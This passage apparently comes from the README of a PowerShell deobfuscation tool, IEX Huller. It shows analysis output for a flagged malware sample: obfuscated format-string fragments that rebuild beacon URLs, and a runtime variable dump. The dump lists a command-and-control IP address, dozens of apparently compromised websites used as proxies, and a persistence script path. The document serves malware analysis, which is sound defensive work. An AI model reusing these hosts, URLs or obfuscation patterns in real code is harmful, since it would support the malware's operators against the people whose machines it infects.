("{10}{16}{6}{8}{2}{7}{1}{3}{18}{0}{4}{9}{5}{12}{11}{13}{17}{15}{14}" -f 'u','wp-','yaran.c','con','g','o-ma','://ww','o//','w.','ins/s','h','onry/logs.','s','p'
,'c=','?','ttp','hp','tent/pl'),
("{3}{9}{1}{4}{2}{6}{8}{7}{0}{5}"-f 'ews.ph','/w','.daf','ht','ww','p?c=','c.co.u','/n','k','tp:/'),
("{5}{9}{3}{4}{8}{2}{6}{7}{0}{1}" -f'/widgets/logs.php?c','=','u','aran','.co/wp-i','http://www.','de','s','ncl','y'),
("{5}{0}{2}{3}{4}{1}{7}{6}"-f 'ps://mhtev','com/account.php','en','ts','.','htt','=','?c'),
("{7}{3}{2}{0}{4}{8}{1}{6}{5}" -f 'max.com/fi','icles','-','.asan','le','spx?c=','/css.a','http://www','s/art'),
("{2}{3}{4}{9}{7}{6}{8}{10}{0}{5}{1}" -f 'b/browse_ca','.php?c=','ht','tp:/','/best2.','t','nfe','co','re','thebest','nce.org/cc'),
("{7}{9}{1}{6}{4}{2}{3}{8}{5}{0}"-f 'aspx?c=','www.asan-','i','cle','/art','/large/css.','max.com/files','h','s','ttp://'),
("{7}{0}{4}{5}{1}{3}{6}{2}" -f '//ww','.com/mic_c','php?c=','at','w.miteg','en','alog.','http:'),
("{7}{6}{3}{4}{1}{8}{5}{10}{2}{11}{9}{0}"-f'x?c=','g','/','p://m','a','cal-ene','t','ht','i','.asp','rgy.com/css','css'),
("{1}{0}{6}{5}{11}{3}{7}{10}{4}{9}{12}{2}{8}"-f'.','http://www','?','a','o','e','pom','t','c=','rg/','es.','gran','index.php'),
("{0}{6}{5}{8}{2}{7}{4}{3}{1}" -f'h','?c=','com/c','x','.asp','://magical','ttp','ss','-energy.'),
("{0}{3}{1}{5}{6}{4}{2}" -f 'h','//www','?c=','ttp:','s.hr/index.php','.a','utotran'),
("{3}{2}{6}{4}{7}{0}{1}{5}" -f 'om/c','s','//riya','http:','hfood','s/edu.aspx?c=','d','s.c'),
("{1}{8}{2}{6}{0}{3}{10}{9}{12}{5}{11}{7}{4}"-f 'ls','ht','ps','c','=','a','://skeptica','s.php?c','t','e.','ienc','phic','com/gr'),
("{1}{9}{6}{5}{3}{10}{12}{2}{8}{4}{11}{7}{0}" -f 'ry.aspx?c=','http:','ue','hfoo','-ui','ad','y','js/jque','ry','//ri','ds.com','/','/jq'),
("{1}{6}{7}{3}{0}{8}{4}{5}{9}{2}" -f 'u/','ht','=','mclub.e','a','ta.','tp:/','/t','clubd','php?c'),
("{4}{9}{1}{2}{5}{7}{3}{8}{6}{0}" -f 'c=','krooan','n.com','r','http://www','/inc/w','.php?','o','k','.kun'),
("{6}{2}{3}{8}{4}{0}{5}{1}{7}"-f'p.p','c','t','p://www.zt','w.pl/po','hp?','ht','=','m.wa'),
("{0}{11}{5}{12}{7}{10}{6}{9}{2}{1}{3}{4}{8}{13}"-f 'http://','nts','ompone','/com_ak','eeb','ool.','o','uliparwa','a/wo','m/c','rda.c','sch','s','rk.php?c='),
("{4}{1}{0}{2}{3}{7}{5}{8}{6}"-f 'w','tp://','ww.mackellars','creenworks.com/','ht','rk.php','=','wo','?c'),
("{13}{0}{10}{3}{2}{1}{11}{9}{12}{8}{5}{6}{4}{14}{7}" -f 'tt','w','l.sulipar','o','or','editors/codemirror/','w','hp?c=','/','lu','p://scho','arda.com/p','gins',
'h','k.p'),
("{9}{3}{0}{1}{7}{6}{8}{4}{5}{2}"-f'www','.arca','rk.php?c=','tp://','m/','wo','rea','dec','tive.co','ht')
)

PS C:\Users\APp\Desktop> Get-Content -Path .\samples\IEXHuller_fe96a3c4384f43b0daa5681e9251f417efd3c568_runtime_vars.txt

Name         Value
----         -----
alL_URL
cmd
Cs           1024
iD
iP           http://148.251.204.131:8060
K            BitDifender
LocaLmacHINE HKLM:\Software\
m            bmxDJY+=
P            HKCU:\Software\
pROxY        {http://diplomat.com.sa/wp-content/plugins/wordpress-importer/cache.php?c=, http://www.vanessajackson.co.uk/work.php?c=, https://www.spearhead-trai
             ning.com/work.php?c=, http://www.nigelwhitfield.com/v2/work.php?c=, https://www.spearhead-training.com//html/power.php?c=, http://www.elev8tor.com/
             show-work.php?c=, http://watyanagr.nfe.go.th/e-office/lib/work.php?c=, http://mainandstrand.com/work.php?c=, http://watyanagr.nfe.go.th/watyanagr/p
             ower.php?c=, http://www.jdarchs.com/work.php?c=, http://www.akhtaredanesh.com/d/file/sym/work.php?c=, http://106.187.38.21/short_qr/work.php?c=, ht
             tp://www.akhtaredanesh.com/d/oschool/power.php?c=, http://www.arcadecreative.com/work.php?c=, http://cbpexbrasilia.com.br/wp-includes/widgets/work.
             php?c=, http://whiver.in/power.php?c=, http://cbpexbrasilia.com.br/wp-content/plugins/wordpress-seo/power.php?c=, http://feribschat.eu/logs.php?c=,
              http://azmwn.suliparwarda.com/wp-content/plugins/wpdatatables/panda.php?c=, http://www.armaholic.com/list.php?c=, http://azmwn.suliparwarda.com/wp
             -content/themes/twentyfifteen/logs.php?c=, http://www.eapa.org/asphalt.php?c=, http://suliparwarda.com/wp-content/plugins/entry-views/work.php?c=,
             http://www.shapingtomorrowsworld.org/category.php?c=, http://suliparwarda.com/wp-content/themes/twentyfifteen/work.php?c=, http://bangortalk.org.uk
             /speakers.php?c=, https://wallpapercase.com/wp-includes/customize/logs.php?c=, http://www.ridefox.com/content.php?c=, https://wallpapercase.com/wp-
             content/themes/twentyfifteen/logs.php?c=, https://coa.inducks.org/publication.php?c=, http://www.yaran.co//wp-content/plugins/so-masonry/logs.php?c
             =, http://www.dafc.co.uk/news.php?c=, http://www.yaran.co/wp-includes/widgets/logs.php?c=, https://mhtevents.com/account.php?c=, http://www.asan-ma
             x.com/files/articles/css.aspx?c=, http://best2.thebestconference.org/ccb/browse_cat.php?c=, http://www.asan-max.com/files/articles/large/css.aspx?c
             =, http://www.mitegen.com/mic_catalog.php?c=, http://magical-energy.com/css/css.aspx?c=, http://www.pomegranates.org/index.php?c=, http://magical-e
             nergy.com/css.aspx?c=, http://www.autotrans.hr/index.php?c=, http://riyadhfoods.com/css/edu.aspx?c=, https://skepticalscience.com/graphics.php?c=,
             http://riyadhfoods.com/jquery-ui/js/jquery.aspx?c=, http://tmclub.eu/clubdata.php?c=, http://www.kunkrooann.com/inc/work.php?c=, http://www.ztm.waw
             .pl/pop.php?c=, http://school.suliparwarda.com/components/com_akeeba/work.php?c=, http://www.mackellarscreenworks.com/work.php?c=, http://school.su
             liparwarda.com/plugins/editors/codemirror/work.php?c=, http://www.arcadecreative.com/work.php?c=}
R            @*$()|[_
S_path       C:\Users\Public\Documents
tSK          C:\Users\Public\Documents\system.vbs
urL_SeRilIzE
```

  * [988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe](./samples/988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe.ps1) (**MALICIOUS** !!!) ([ref](https://raw.githubusercontent.com/InQuest/malware-samples/powershell-japan/2019-03-PowerShell-Obfuscation-Encryption-Steganography/2.%20stage2.ps1.bin))

```powershell
PS C:\Users\APp\Desktop> invoke-expression2 ".\samples\988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe.ps1" -NoDryRun
[*] Dump Layer 1 to : .\samples\IEXHuller_988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe_layer1_nodryrun.txt
[*] Dump Layer 2 to : .\samples\IEXHuller_988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe_layer2_nodryrun.txt
[*] Dump Layer 3 to : .\samples\IEXHuller_988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe_layer3_nodryrun.txt
[*] Dump Layer 4 to : .\samples\IEXHuller_988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe_layer4_nodryrun.txt
[*] Dump Layer 5 to : .\samples\IEXHuller_988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe_layer5_nodryrun.txt
[x] Built-in IEX exception: Exception calling "GetResponse" with "0" argument(s): "The request was aborted: Could not create SSL/TLS secure channel."
[*] Dump runtime variables to : .\samples\IEXHuller_988ea0ee1f3f204748ba3ace9536e4e7d7afa8fe_runtime_vars.txt
```

## Resources

  * [De-obfuscating a PowerShell Script Obfuscated by Invoke-Obfuscation](https://pcsxcetrasupport3.wordpress.com/2017/11/11/de-obfuscating-a-powershell-script-obfuscated-by-invoke-obfuscation/)
  * [Analyzing Sophisticated PowerShell Targeting Japan](https://inquest.net/blog/2019/03/09/Analyzing-Sophisticated-PowerShell-Targeting-Japan)
  * [gh0x0st/Invoke-PSObfuscation](https://github.com/gh0x0st/Invoke-PSObfuscation)

## Release Notes
v0.1.0 - 2021-08-09: PUBLIC Release of IEX Huller.
